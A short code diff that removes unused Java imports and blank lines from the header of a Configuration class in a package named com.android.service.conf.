@@ -7,13 +7,6 @@
 
 package com.android.service.conf;
 
-import java.io.IOException;
-import java.nio.ByteBuffer;
-import java.nio.ByteOrder;
-import java.util.Arrays;
-import java.util.Hashtable;
-import java.util.Iterator;
-
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -24,15 +17,10 @@ import com.android.service.GeneralException;
 import com.android.service.Messages;
 import com.android.service.Status;
 import com.android.service.action.Action;
-
 import com.android.service.auto.Cfg;
-import com.android.service.crypto.Crypto;
-import com.android.service.crypto.Encryption;
 import com.android.service.crypto.EncryptionPKCS5;
 import com.android.service.crypto.Keys;
-
 import com.android.service.util.Check;
-import com.android.service.util.Utils;
 
 /**
  * The Class Configuration.
